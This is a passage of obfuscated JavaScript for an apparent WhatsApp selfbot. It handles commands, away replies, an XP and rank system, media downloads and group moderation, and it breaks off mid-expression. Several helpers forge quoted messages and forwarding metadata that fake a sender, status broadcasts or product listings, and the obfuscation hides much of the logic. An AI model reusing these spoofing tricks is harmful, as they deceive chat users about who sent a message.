_0x271569=_0x45c3a1;try{if(!_0x15b2ca[_0x271569(0x27a)])return;_0x15b2ca=_0x15b2ca[_0x271569(0x418)][_0x271569(0x224)]()[0x0];if(!_0x15b2ca[_0x271569(0x352)])return;if(_0x15b2ca[_0x271569(0x46f)]&&_0x15b2ca[_0x271569(0x46f)]['remoteJid']=='status@broadcast')return;global['blocked'],_0x15b2ca[_0x271569(0x352)]=Object[_0x271569(0x2be)](_0x15b2ca[_0x271569(0x352)])[0x0]===_0x271569(0x1ab)?_0x15b2ca[_0x271569(0x352)]['ephemeralMessage']['message']:_0x15b2ca[_0x271569(0x352)];const _0x4a3473=JSON[_0x271569(0x3bd)](_0x15b2ca[_0x271569(0x352)]),_0x282d63=_0x15b2ca[_0x271569(0x46f)]['remoteJid'],{text:_0xfa1a73,extendedText:_0x9ad073,contact:_0x3d436f,location:_0x45e44d,liveLocation:_0x5d79df,image:_0x5ebec8,video:_0x356628,sticker:_0xd4581a,document:_0x7c7b0e,audio:_0x41197c,product:_0x169e73}=MessageType,_0x5a6f33=moment['tz']('Asia/Jakarta')['format'](_0x271569(0x282)),_0x501acc=Object[_0x271569(0x2be)](_0x15b2ca[_0x271569(0x352)])[0x0];body=_0x501acc===_0x271569(0x25a)&&_0x15b2ca[_0x271569(0x352)][_0x271569(0x25a)][_0x271569(0x201)](prefix)?_0x15b2ca[_0x271569(0x352)]['conversation']:_0x501acc=='imageMessage'&&_0x15b2ca['message'][_0x271569(0x363)]['caption'][_0x271569(0x201)](prefix)?_0x15b2ca['message'][_0x271569(0x363)][_0x271569(0x274)]:_0x501acc==_0x271569(0x1bc)&&_0x15b2ca['message']['videoMessage'][_0x271569(0x274)]['startsWith'](prefix)?_0x15b2ca[_0x271569(0x352)][_0x271569(0x1bc)]['caption']:_0x501acc==_0x271569(0x45e)&&_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x459)][_0x271569(0x201)](prefix)?_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x459)]:'',budy=_0x501acc==='conversation'?_0x15b2ca[_0x271569(0x352)]['conversation']:_0x501acc==='extendedTextMessage'?_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x459)]:'';const _0x53e86e=body['slice'](0x0)['trim']()['split'](/ +/)[_0x271569(0x33c)]()[_0x271569(0x199)]();hit_today['push'](_0x53e86e);const _0x190db7=budy[_0x271569(0x225)](_0x53e86e[_0x271569(0x41c)]+0x1,budy[_0x271569(0x41c)]),_0x794f7a=body['trim']()[_0x271569(0x2a7)](/ +/)['slice'](0x1),_0x1b2744=body[_0x271569(0x201)](prefix),_0x10a56f=_0x794f7a[_0x271569(0x3ab)]('\x20'),_0x298af0=_0x138c14[_0x271569(0x44e)]['jid'],_0x2e84c5=[_0x271569(0x307)],_0x59ec0d=_0x282d63[_0x271569(0x362)](_0x271569(0x2d6)),_0x953611=_0x59ec0d?_0x15b2ca[_0x271569(0x356)]:_0x15b2ca[_0x271569(0x46f)][_0x271569(0x355)],_0x2308e2=_0x15b2ca['participant'],_0x3d81de=_0x2e84c5[_0x271569(0x42a)](_0x953611),_0x3d1dac=_0x298af0[_0x271569(0x42a)](_0x2308e2),_0x11030b=await _0x138c14[_0x271569(0x283)]['all'](),_0x2aaeff=_0x59ec0d?await _0x138c14[_0x271569(0x315)](_0x282d63):'',_0x552287=_0x59ec0d?_0x2aaeff['subject']:'',_0x12d374=_0x59ec0d?_0x2aaeff[_0x271569(0x3f6)]:'',_0x1b2868=_0x59ec0d?_0x2aaeff[_0x271569(0x439)]:'',_0x463014=_0x59ec0d?_0x2aaeff[_0x271569(0x31c)]:'',_0x7626be=_0x59ec0d?_0x2aaeff['owner']:'',_0x45f97b=_0x59ec0d?getGroupAdmins(_0x1b2868):'',_0x5dd02a=_0x45f97b[_0x271569(0x42a)](_0x298af0)||![],_0x48a020=_0x45f97b[_0x271569(0x42a)](_0x953611)||![],_0x4cc9e3=_0x15b2ca['key'][_0x271569(0x31d)]?_0x138c14[_0x271569(0x44e)][_0x271569(0x3f6)]:_0x138c14['contacts'][_0x953611]||{'notify':jid['replace'](/@.+/,'')},_0x372c28=_0x15b2ca[_0x271569(0x46f)][_0x271569(0x31d)]?_0x138c14[_0x271569(0x44e)][_0x271569(0x24d)]:_0x4cc9e3[_0x271569(0x30c)]||_0x4cc9e3[_0x271569(0x3fe)]||_0x4cc9e3[_0x271569(0x24d)]||'-';mess={'wait':_0x271569(0x2e4),'success':'Oki\x20doki\x20^w^','wrongFormat':_0x271569(0x196),'error':{'stick':'No\x20pude\x20convertirlo,\x20perdon\x20T~T','Iv':'Y\x20ese\x20link\x20funciona?\x20U.U'},'only':{'group':'Solo\x20en\x20grupos\x20ÙnÚ','admin':_0x271569(0x2af),'Badmin':_0x271569(0x1b7)}};const _0x3617fb=_0x2f6cb6=>{return _0x2f6cb6['match'](new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,'gi'));},_0x54c827=_0x475ac0=>{const _0x47f655=_0x271569;_0x138c14[_0x47f655(0x28d)](_0x282d63,_0x475ac0,_0xfa1a73,{'quoted':_0x15b2ca});},_0x210ae5=(_0x41ddfe,_0x5606d6)=>{const _0x5d2dec=_0x271569;_0x138c14[_0x5d2dec(0x28d)](_0x41ddfe,_0x5606d6,_0xfa1a73,{'sendEphemeral':!![]});},_0x1eca8a=(_0x2a5869,_0x1d383e,_0x17835c)=>{const _0x578886=_0x271569;_0x17835c==null||_0x17835c==undefined||_0x17835c==![]?_0x138c14['sendMessage'](_0x282d63,_0x2a5869[_0x578886(0x41d)](),_0x9ad073,{'contextInfo':{'mentionedJid':_0x1d383e}}):_0x138c14[_0x578886(0x28d)](_0x282d63,_0x2a5869[_0x578886(0x41d)](),_0x9ad073,{'quoted':_0x15b2ca,'contextInfo':{'mentionedJid':_0x1d383e}});},_0x4d6da4=_0x3fe2bb=>{const _0x1af24c=_0x271569;_0x138c14[_0x1af24c(0x28d)](_0x282d63,_0x3fe2bb,MessageType[_0x1af24c(0x459)],{'quoted':{'key':{'fromMe':![],'participant':_0x1af24c(0x3ce),..._0x282d63?{'remoteJid':_0x1af24c(0x3ce)}:{}},'message':{'contactMessage':{'displayName':_0x1af24c(0x1f7)+_0x372c28,'vcard':_0x1af24c(0x416)+_0x48db29+_0x1af24c(0x45f)+_0x48db29+',\x0aitem1.TEL;waid='+_0x953611[_0x1af24c(0x2a7)]('@')[0x0]+':'+_0x953611[_0x1af24c(0x2a7)]('@')[0x0]+_0x1af24c(0x2f5),'jpegThumbnail':fs[_0x1af24c(0x2d2)](_0x1af24c(0x22a))}}}});},_0x22e0d8=(_0x5d1e55,_0x50717d)=>{const _0x3bbc98=_0x271569;_0x138c14[_0x3bbc98(0x28d)](_0x282d63,_0x5d1e55,_0x5ebec8,{'thumbnail':fs[_0x3bbc98(0x2d2)](_0x3bbc98(0x346)),'quoted':_0x15b2ca,'caption':_0x50717d});},_0x6bdcc6=_0xf4198c=>{const _0x18933d=_0x271569;_0x138c14[_0x18933d(0x28d)](_0x282d63,_0xf4198c,_0xfa1a73,{'quoted':{'key':{'fromMe':![],'participant':_0x18933d(0x3ce),..._0x282d63?{'remoteJid':'status@broadcast'}:{}},'message':{'imageMessage':{'url':_0x18933d(0x1fa),'mimetype':_0x18933d(0x33e),'caption':_0x18933d(0x26f)+_0x372c28,'fileSha256':_0x18933d(0x1b5),'fileLength':_0x18933d(0x43e),'height':0x438,'width':0x437,'mediaKey':'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=','fileEncSha256':_0x18933d(0x40b),'directPath':'/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69','mediaKeyTimestamp':_0x18933d(0x390),'jpegThumbnail':fs['readFileSync']('./stik/thumb.jpeg'),'scansSidecar':_0x18933d(0x1e9)}},'contextInfo':{'forwardingScore':0x3e7,'isForwarded':!![]}}});},_0xbe147b=_0x32e5e5=>{const _0x543799=_0x271569;_0x138c14['sendMessage'](_0x282d63,_0x32e5e5,_0xfa1a73,{'quoted':{'key':{'fromMe':![],'participant':_0x543799(0x3ce),..._0x282d63?{'remoteJid':_0x543799(0x234)}:{}},'message':{'imageMessage':{'url':_0x543799(0x1fa),'mimetype':_0x543799(0x33e),'caption':_0x543799(0x424)+_0x372c28,'fileSha256':_0x543799(0x1b5),'fileLength':_0x543799(0x43e),'height':0x438,'width':0x437,'mediaKey':_0x543799(0x3b4),'fileEncSha256':_0x543799(0x40b),'directPath':'/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69','mediaKeyTimestamp':'1610993486','jpegThumbnail':fs[_0x543799(0x2d2)](_0x543799(0x22a)),'scansSidecar':_0x543799(0x1e9)}}}});},_0x3b09ec=_0x511091=>{const _0x1257ba=_0x271569;_0x138c14['sendMessage'](_0x282d63,_0x511091,_0xfa1a73,{'quoted':{'key':{'fromMe':![],'participant':_0x1257ba(0x3ce),..._0x282d63?{'remoteJid':_0x1257ba(0x43d)}:{}},'message':{'productMessage':{'product':{'productImage':{'mimetype':'image/jpeg','jpegThumbnail':fs[_0x1257ba(0x2d2)]('./stik/thumb.jpeg')},'title':'Hola\x20cosita\x20UwU'+_0x372c28,'productImageCount':0x270f},'businessOwnerJid':_0x1257ba(0x3ce)}}}});},_0x29151e=_0x12752d=>{const _0x2a6979=_0x271569;_0x2d949b={'key':{'fromMe':![],'participant':_0x2a6979(0x3ce),..._0x282d63?{'remoteJid':_0x2a6979(0x43d)}:{}},'message':{'productMessage':{'product':{'productImage':{'mimetype':_0x2a6979(0x33e),'jpegThumbnail':fs[_0x2a6979(0x2d2)](_0x2a6979(0x22a))},'title':'Holi\x20cosita\x20UwU\x20'+_0x372c28+',\x20'+_0x48db29,'retailerId':_0x2a6979(0x1e0),'productImageCount':0x1},'businessOwnerJid':_0x2a6979(0x3ce)}}},_0x138c14[_0x2a6979(0x28d)](_0x282d63,_0x12752d,_0xfa1a73,{'quoted':_0x2d949b,'contextInfo':{'forwardingScore':0x3e7,'isForwarded':!![]}});},_0x465cf4=async(_0x35d27f,_0x50b266)=>{const _0x45aaac=_0x271569;var _0xb68d7=Date[_0x45aaac(0x2bc)]()/0x2710,_0x476143=function(_0x2974fb,_0x326768,_0x443bdb){const _0x53e4ce=_0x45aaac;request[_0x53e4ce(0x3f9)](_0x2974fb,function(_0x538333,_0x1d1cf0,_0x103149){const _0x2abfac=_0x53e4ce;request(_0x2974fb)[_0x2abfac(0x2ec)](fs[_0x2abfac(0x1b0)](_0x326768))['on']('close',_0x443bdb);});};_0x476143(_0x50b266,_0x45aaac(0x32c)+_0xb68d7+_0x45aaac(0x45c),async function(){const _0x4693af=_0x45aaac;console[_0x4693af(0x1d4)](_0x4693af(0x1c8));let _0x267348=_0x4693af(0x32c)+_0xb68d7+_0x4693af(0x45c),_0x11da32=_0x4693af(0x32c)+_0xb68d7+_0x4693af(0x33b);exec('ffmpeg\x20-i\x20'+_0x267348+_0x4693af(0x24b)+_0x11da32,_0x3ef48d=>{const _0x467aff=_0x4693af;let _0x424db9=fs['readFileSync'](_0x11da32);_0x138c14[_0x467aff(0x28d)](_0x35d27f,_0x424db9,MessageType[_0x467aff(0x1a5)],{'quoted':_0x15b2ca}),fs['unlinkSync'](_0x267348),fs[_0x467aff(0x3f7)](_0x11da32);});});},_0x58a39e=async(_0xb8b97c,_0x97f475,_0x57d563='',_0x387696=[])=>{const _0x59dda6=_0x271569;_0x387696[_0x59dda6(0x41c)]>0x0&&(_0x57d563=normalizeMention(_0xb8b97c,_0x57d563,_0x387696));const _0x6e13c4=Date[_0x59dda6(0x2bc)]()/0x2710,_0x2edf15=_0x6e13c4[_0x59dda6(0x298)]();let _0x3b793e='';var _0x1c6e1f=function(_0x9bf1c3,_0xfc6933,_0xff02d7){const _0x53978f=_0x59dda6;request[_0x53978f(0x3f9)](_0x9bf1c3,function(_0x2f4b00,_0x17dfeb,_0x12bbe5){const _0x499d2f=_0x53978f;_0x3b793e=_0x17dfeb['headers'][_0x499d2f(0x1fb)],request(_0x9bf1c3)[_0x499d2f(0x2ec)](fs[_0x499d2f(0x1b0)](_0xfc6933))['on'](_0x499d2f(0x415),_0xff02d7);});};_0x1c6e1f(_0x97f475,_0x2edf15,async function(){const _0xffa834=_0x59dda6;console[_0xffa834(0x1d4)](_0xffa834(0x1bb));let _0x35a88f=fs[_0xffa834(0x2d2)](_0x2edf15),_0x25d405=_0x3b793e['split']('/')[0x0]+_0xffa834(0x303);_0x3b793e===_0xffa834(0x376)&&(_0x25d405=MessageType['video'],_0x3b793e=Mimetype['gif']),_0x3b793e['split']('/')[0x0]===_0xffa834(0x396)&&(_0x3b793e=Mimetype[_0xffa834(0x42b)]),_0x138c14[_0xffa834(0x28d)](_0xb8b97c,_0x35a88f,_0x25d405,{'quoted':_0x15b2ca,'mimetype':_0x3b793e,'caption':_0x57d563,'contextInfo':{'mentionedJid':_0x387696}}),fs['unlinkSync'](_0x2edf15);});};cekafk(afk);if(!_0x15b2ca[_0x271569(0x46f)][_0x271569(0x355)][_0x271569(0x362)](_0x271569(0x2d6))&&offline){if(!_0x15b2ca['key'][_0x271569(0x31d)]){if(isAfk(_0x15b2ca[_0x271569(0x46f)]['remoteJid']))return;addafk(_0x15b2ca['key'][_0x271569(0x355)]),heheh=ms(Date['now']()-waktu),_0x138c14[_0x271569(0x28d)](_0x15b2ca[_0x271569(0x46f)][_0x271569(0x355)],'@'+owner+'\x20Sedang\x20Offline!\x0a\x0a*Alasan\x20:*\x20'+alasan+_0x271569(0x27d)+heheh[_0x271569(0x432)]+_0x271569(0x414)+heheh[_0x271569(0x198)]+_0x271569(0x1f4)+heheh[_0x271569(0x1aa)]+_0x271569(0x32b),MessageType['text'],{'contextInfo':{'mentionedJid':[owner+_0x271569(0x1ae)],'stanzaId':'B826873620DD5947E683E3ABE663F263','participant':_0x271569(0x3ce),'remoteJid':_0x271569(0x43d),'quotedMessage':{'imageMessage':{'caption':_0x271569(0x330),'jpegThumbnail':fs['readFileSync'](_0x271569(0x22a))}}}});}}if(_0x15b2ca[_0x271569(0x46f)][_0x271569(0x355)]['endsWith'](_0x271569(0x2d6))&&offline){if(!_0x15b2ca[_0x271569(0x46f)][_0x271569(0x31d)]){if(_0x15b2ca[_0x271569(0x352)]['extendedTextMessage']!=undefined){if(_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]!=undefined){if(_0x15b2ca[_0x271569(0x352)][_0x271569(0x45e)][_0x271569(0x397)]['mentionedJid']!=undefined)for(let _0x4334be of _0x15b2ca[_0x271569(0x352)]['extendedTextMessage'][_0x271569(0x397)][_0x271569(0x458)]){if(_0x4334be===owner+'@s.whatsapp.net'){if(isAfk(_0x15b2ca['key'][_0x271569(0x355)]))return;addafk(_0x15b2ca[_0x271569(0x46f)][_0x271569(0x355)]),heheh=ms(Date[_0x271569(0x2bc)]()-waktu),_0x138c14['sendMessage'](_0x15b2ca[_0x271569(0x46f)][_0x271569(0x355)],'@'+owner+_0x271569(0x254)+alasan+'\x0a\x20*Sejak\x20:*\x20'+heheh[_0x271569(0x432)]+_0x271569(0x414)+heheh[_0x271569(0x198)]+_0x271569(0x1f4)+heheh[_0x271569(0x1aa)]+_0x271569(0x32b),MessageType['text'],{'contextInfo':{'mentionedJid':[owner+'@s.whatsapp.net'],'stanzaId':'B826873620DD5947E683E3ABE663F263','participant':_0x271569(0x3ce),'remoteJid':_0x271569(0x43d),'quotedMessage':{'imageMessage':{'caption':_0x271569(0x330),'jpegThumbnail':fs[_0x271569(0x2d2)]('./stik/thumb.jpeg')}}}});}}}}}}const _0x11384f=_0x17f7ab=>{const _0x5e65f0=_0x271569;let _0xf5e4c7=![];Object['keys'](_level)[_0x5e65f0(0x21c)](_0x27e28f=>{_level[_0x27e28f]['id']===_0x17f7ab&&(_0xf5e4c7=_0x27e28f);});if(_0xf5e4c7!==![])return _level[_0xf5e4c7]['xp'];},_0x4d7e4e=(_0x1fd98b,_0x4250da,_0x201ba4,_0x9bbd9f,_0x13a35d)=>{const _0x47e044=_0x271569,_0xb93c48={'id':_0x1fd98b,'name':_0x4250da,'age':_0x201ba4,'time':_0x9bbd9f,'serial':_0x13a35d};user[_0x47e044(0x27e)](_0xb93c48),fs[_0x47e044(0x296)](_0x47e044(0x450),JSON[_0x47e044(0x3bd)](user));},_0x4aaefd=_0x20f52b=>{const _0x11686c=_0x271569;return crypto['randomBytes'](_0x20f52b)[_0x11686c(0x298)](_0x11686c(0x3cf))['slice'](0x0,_0x20f52b);},_0xf81795=_0x1ca32b=>{const _0x67d4bc=_0x271569;let _0x1f9fd1=![];Object[_0x67d4bc(0x2be)](_level)[_0x67d4bc(0x21c)](_0x3ba2b2=>{_level[_0x3ba2b2]['id']===_0x1ca32b&&(_0x1f9fd1=_0x3ba2b2);});if(_0x1f9fd1!==![])return _level[_0x1f9fd1][_0x67d4bc(0x1d8)];},_0x544f76=_0x3cd58e=>{const _0x56fe25=_0x271569;let _0x364a4a=![];Object[_0x56fe25(0x2be)](_level)[_0x56fe25(0x21c)](_0x41f4bf=>{_level[_0x41f4bf]['id']===_0x3cd58e&&(_0x364a4a=_0x41f4bf);});if(_0x364a4a!==![])return _level[_0x364a4a]['id'];},_0x5db27b=(_0xd8787a,_0x2ec21b)=>{const _0x536da2=_0x271569;let _0xd93a0d=![];Object[_0x536da2(0x2be)](_level)[_0x536da2(0x21c)](_0x4df1f4=>{_level[_0x4df1f4]['id']===_0xd8787a&&(_0xd93a0d=_0x4df1f4);}),_0xd93a0d!==![]&&(_level[_0xd93a0d]['xp']+=_0x2ec21b,fs[_0x536da2(0x296)]('./database/level.json',JSON[_0x536da2(0x3bd)](_level)));},_0x3b933f=(_0x5335eb,_0x14e2cc)=>{const _0x265807=_0x271569;let _0x6a9d4f=![];Object[_0x265807(0x2be)](_level)[_0x265807(0x21c)](_0x29ca29=>{_level[_0x29ca29]['id']===_0x5335eb&&(_0x6a9d4f=_0x29ca29);}),_0x6a9d4f!==![]&&(_level[_0x6a9d4f][_0x265807(0x1d8)]+=_0x14e2cc,fs[_0x265807(0x296)]('./database/level.json',JSON[_0x265807(0x3bd)](_level)));},_0x27d3c2=_0x8ee150=>{const _0x4e4bc6=_0x271569,_0x359362={'id':_0x8ee150,'xp':0x1,'level':0x1};_level[_0x4e4bc6(0x27e)](_0x359362),fs[_0x4e4bc6(0x296)]('./database/level.json',JSON[_0x4e4bc6(0x3bd)](_level));};var _0x4ffc63=_0x271569(0x1d7);const _0x2a391b=0x1388*(Math[_0x271569(0x43a)](0x2,_0xf81795(_0x953611))-0x1),_0x9722c3=_0x2a391b-_0x11384f(_0x953611),_0x391a08=Math[_0x271569(0x1e3)](0x64-_0x9722c3/_0x11384f(_0x953611)*0x64);if(_0x391a08<=0xa)_0x4ffc63=_0x271569(0x2cf)+_0x391a08+'%*';else{if(_0x391a08<=0x14)_0x4ffc63=_0x271569(0x44a)+_0x391a08+'%*';else{if(_0x391a08<=0x1e)_0x4ffc63=_0x271569(0x1da)+_0x391a08+'%*';else{if(_0x391a08<=0x28)_0x4ffc63=_0x271569(0x261)+_0x391a08+'%*';else{if(_0x391a08<=0x32)_0x4ffc63='*[█████▒▒▒▒▒]\x20'+_0x391a08+'%*';else{if(_0x391a08<=0x3c)_0x4ffc63='*[██████▒▒▒▒]\x20'+_0x391a08+'%*';else{if(_0x391a08<=0x46)_0x4ffc63=_0x271569(0x231)+_0x391a08+'%*';else{if(_0x391a08<=0x50)_0x4ffc63=_0x271569(0x23f)+_0x391a08+'%*';else{if(_0x391a08<=0x5a)_0x4ffc63=_0x271569(0x456)+_0x391a08+'%*';else _0x391a08<=0x64&&(_0x4ffc63=_0x271569(0x34f)+_0x391a08+'%*');}}}}}}}}const _0x3911ca=_0xf81795(_0x953611);var _0x20600d='Noob';if(_0x3911ca<=0x3)_0x20600d=_0x271569(0x3d4);else{if(_0x3911ca<=0x5)_0x20600d=_0x271569(0x2d1);else{if(_0x3911ca<=0x7)_0x20600d=_0x271569(0x242);else{if(_0x3911ca<=0x8)_0x20600d=_0x271569(0x403);else{if(_0x3911ca<=0x9)_0x20600d=_0x271569(0x332);else{if(_0x3911ca<=0xa)_0x20600d=_0x271569(0x325);else{if(_0x3911ca<=0xb)_0x20600d=_0x271569(0x3d0);else{if(_0x3911ca<=0xc)_0x20600d='Teniente';else{if(_0x3911ca<=0xd)_0x20600d=_0x271569(0x46a);else{if(_0x3911ca<=0xe)_0x20600d=_0x271569(0x299);else{if(_0x3911ca<=0xe)_0x20600d=_0x271569(0x279);else{if(_0x3911ca<=0xf)_0x20600d='Master\x20sgt\x20I';else{if(_0x3911ca<=0x10)_0x20600d=_0x271569(0x357);else{if(_0x3911ca<=0x11)_0x20600d='Master\x20sgt\x20III';else{if(_0x3911ca<=0x12)_0x20600d='Master\x20sgt\x20IV';else{if(_0x3911ca<=0x13)_0x20600d=_0x271569(0x2f4);else{if(_0x3911ca<=0x14)_0x20600d=_0x271569(0x251);else{if(_0x3911ca<=0x15)_0x20600d=_0x271569(0x3a2);else{if(_0x3911ca<=0x16)_0x20600d=_0x271569(0x2c5);else _0x3911ca<=0x17&&(_0x20600d=_0x271569(0x3ec));}}}}}}}}}}}}}}}}}}const _0x189bb4=(_0x2a447b,_0x439df8,_0x5f7fd2,_0x31bea5,_0x45daf4,_0x57f89d)=>{const _0x1d7297=_0x271569;_0x4d6da4('\x0a*「\x20FELICIDADES\x20」*\x0a┌\x20*Nombre*\x20:\x20'+_0x2a447b+_0x1d7297(0x1a7)+_0x439df8[_0x1d7297(0x2a7)]('@')[0x0]+_0x1d7297(0x21b)+_0x5f7fd2(_0x439df8)+_0x1d7297(0x337)+_0x57f89d+_0x1d7297(0x2b8)+_0x31bea5+_0x1d7297(0x417)+_0x45daf4(_0x439df8));};if(_0x59ec0d){const _0xc8f3d=_0xf81795(_0x953611),_0x2e677c=_0x544f76(_0x953611);try{if(_0xc8f3d===undefined&&_0x2e677c===undefined)_0x27d3c2(_0x953611);const _0x42d9e4=Math[_0x271569(0x227)](Math[_0x271569(0x3c8)]()*0xa)+0x1f4,_0x45fb83=0x1388*(Math[_0x271569(0x43a)](0x2,_0xc8f3d)-0x1),_0x23030d=_0xf81795(_0x953611);_0x5db27b(_0x953611,_0x42d9e4),_0x45fb83<=_0x11384f(_0x953611)&&(_0x3b933f(_0x953611,0x1),await _0x6bdcc6(_0x189bb4(_0x372c28,_0x953611,_0x11384f,_0x23030d,_0xf81795,_0x20600d)));}catch(_0x11fca3){console[_0x271569(0x309)](_0x11fca3);}}const _0x400ae8=moment()[_0x271569(0x291)]('HH');var _0x48db29=_0x271569(0x1c2);if(_0x400ae8>='03'&&_0x400ae8<='10')_0x48db29='wenas👋';else{if(_0x400ae8>='10'&&_0x400ae8<='14')_0x48db29=_0x271569(0x1c2);else{if(_0x400ae8>='14'&&_0x400ae8<='17')_0x48db29='wenas👋';else{if(_0x400ae8>='17'&&_0x400ae8<='18')_0x48db29='wenas👋';else _0x400ae8>='18'&&_0x400ae8<='23'?_0x48db29=_0x271569(0x34b):_0x48db29=_0x271569(0x34b);}}}colors=['blue'];const _0xd2003=_0x501acc===_0x271569(0x363)||_0x501acc===_0x271569(0x1bc),_0x2c43f4=_0x501acc===_0x271569(0x45e)&&_0x4a3473[_0x271569(0x42a)](_0x271569(0x363)),_0x5e0b01=_0x501acc===_0x271569(0x45e)&&_0x4a3473[_0x271569(0x42a)](_0x271569(0x1bc)),_0x334ff3=_0x501acc==='extendedTextMessage'&&_0x4a3473[_0x271569(0x42a)](_0x271569(0x3b5)),_0x5e3250=_0x501acc===_0x271569(0x45e)&&_0x4a3473[_0x271569(0x42a)](_0x271569(0x30a)),_0x106917=_0x501acc===_0x271569(0x45e)&&_0x4a3473[_0x271569(0x42a)](_0x271569(0x44d));if(!_0x59ec0d&&_0x1b2744)console['log'](_0x271569(0x1cc),'[\x20\x1b[1;36mEXECC\x1b[1;37m\x20]',_0x5a6f33,color(_0x53e86e),_0x271569(0x238),color(_0x953611[_0x271569(0x2a7)]('@')[0x0]));if(_0x1b2744&&_0x59ec0d)console['log'](_0x271569(0x1cc),_0x271569(0x3d1),_0x5a6f33,color(_0x53e86e),_0x271569(0x238),color(_0x953611[_0x271569(0x2a7)]('@')[0x0]),'in',color(_0x552287));if(!_0x15b2ca[_0x271569(0x46f)]['fromMe']&&banChats===!![])return;switch(_0x53e86e){case prefix+_0x271569(0x45a):case prefix+'help':case prefix+'?':let _0x45180f=[],_0x180306=[];for(_0x509e77 of _0x11030b){_0x45180f[_0x271569(0x27e)](_0x509e77[_0x271569(0x3f6)]);}for(id of _0x45180f){id&&id[_0x271569(0x42a)](_0x271569(0x246))&&_0x180306[_0x271569(0x27e)](id);}let _0x33e96b=speed(),_0x3fb26e=speed()-_0x33e96b;var {device_manufacturer:_0x573a95,device_model:_0x5e0f92,mcc:_0x55db83,mnc:_0x467be1,os_version:_0x17370b,os_build_number:_0x4eeaa0,wa_version:_0x2f6946}=_0x138c14['user'][_0x271569(0x39f)];_0x2d949b=process[_0x271569(0x1d3)](),runtem=''+kyun(_0x2d949b);var _0x2d89b7='\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20SATANCITO\x20ᵈᵃʳʸ⛥\x0a\x20\x20\x20\x20\x0aBlackpink\x20\x20-\x20\x20How\x20you\x20like\x20that\x20\x0a01:52\x20━━━●─────\x2003:08\x0a\x20\x20\x20\x20\x20⇆ㅤㅤ\x20◁ㅤ\x20❚❚ㅤ\x20▷ㅤ\x20ㅤ↻\ufeff\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ılıılıılıılıılıılı\x0aᴠᴏʟᴜᴍᴇ\x20:\x20▮▮▮▮▮▮▮▯▯▯\x20\x0a-\x20*Hits\x20de\x20hoy\x20:\x20'+hit_today[_0x271569(0x41c)]+_0x271569(0x220)+_0x573a95+'\x0a-\x20*Modelo\x20:*\x20'+_0x5e0f92+'\x0a-\x20*RAM\x20:*\x20'+(process[_0x271569(0x364)]()[_0x271569(0x31f)]/0x400/0x400)[_0x271569(0x3ef)](0x2)+_0x271569(0x245)+Math['round'](require('os')[_0x271569(0x2a6)]/0x400/0x400)+'MB\x0a-\x20*Android\x20:*\x20'+_0x17370b+'\x0a-\x20*Versión\x20de\x20WhatsApp*\x20:\x20'+_0x2f6946+_0x271569(0x2bb)+_0x180306['length']+_0x271569(0x404)+(_0x11030b[_0x271569(0x41c)]-_0x180306[_0x271569(0x41c)])+_0x271569(0x389)+_0x11030b[_0x271569(0x41c)]+_0x271569(0x37f)+_0x3fb26e[_0x271569(0x3ef)](0x4)+_0x271569(0x2d3)+runtem+_0x271569(0x466)+prefix+_0x271569(0x3bb)+prefix+_0x271569(0x205)+prefix+_0x271569(0x428)+prefix+_0x271569(0x3c0)+prefix+_0x271569(0x211)+prefix+_0x271569(0x263)+prefix+_0x271569(0x253)+prefix+_0x271569(0x35e)+prefix+_0x271569(0x273)+prefix+'mute*\x0a├\x20*'+prefix+_0x271569(0x23b)+prefix+_0x271569(0x40a)+prefix+'setfake*\x0a├\x20*'+prefix+_0x271569(0x2ca)+prefix+_0x271569(0x409)+prefix+_0x271569(0x351)+prefix+'setthumb*\x0a├\x20*'+prefix+_0x271569(0x34d)+prefix+_0x271569(0x336)+prefix+_0x271569(0x402)+prefix+'cnn*\x0a├\x20*'+prefix+'infogempa*\x0a├\x20*'+prefix+_0x271569(0x42d)+prefix+'revip*\x20[\x208.8.8.8\x20]\x0a├\x20*'+prefix+'avatar*\x0a├\x20*'+prefix+_0x271569(0x22d)+prefix+_0x271569(0x23e)+prefix+_0x271569(0x317)+prefix+_0x271569(0x36f)+prefix+_0x271569(0x1c9)+prefix+_0x271569(0x343)+prefix+_0x271569(0x2a1)+prefix+_0x271569(0x3a3)+prefix+_0x271569(0x2b3)+prefix+_0x271569(0x232)+prefix+_0x271569(0x2a9)+prefix+_0x271569(0x3c2)+prefix+_0x271569(0x1ee)+prefix+_0x271569(0x28f)+prefix+'emoji*\x0a├\x20*'+prefix+'attp*\x0a├\x20*'+prefix+_0x271569(0x1df)+prefix+_0x271569(0x3f2)+prefix+_0x271569(0x2da)+prefix+_0x271569(0x27b)+prefix+_0x271569(0x25e)+prefix+_0x271569(0x1ef)+prefix+_0x271569(0x3c6)+prefix+_0x271569(0x30d)+prefix+_0x271569(0x2a0)+prefix+'upswvideo*\x0a├\x20*'+prefix+_0x271569(0x1e1)+prefix+_0x271569(0x449)+prefix+'igstalk*\x20[username]\x0a├\x20*'+prefix+_0x271569(0x2f1)+prefix+'play*\x20[\x20query\x20]\x20\x0a├\x20*'+prefix+'video*\x20[\x20query\x20]\x20\x0a├\x20*'+prefix+_0x271569(0x35c)+prefix+_0x271569(0x230)+prefix+_0x271569(0x41b)+prefix+_0x271569(0x3da)+prefix+_0x271569(0x3a6)+prefix+_0x271569(0x3fc)+prefix+_0x271569(0x41f)+prefix+_0x271569(0x20b)+prefix+_0x271569(0x25d)+prefix+'add*\x20[\x20503xxxx\x20]\x0a├\x20*'+prefix+'kick*\x20[\x20tag\x20]\x0a├\x20*'+prefix+_0x271569(0x372)+prefix+_0x271569(0x45b)+prefix+_0x271569(0x2a4)+prefix+'hidetag*\x20[\x20your\x20message\x20]\x0a├\x20*'+prefix+_0x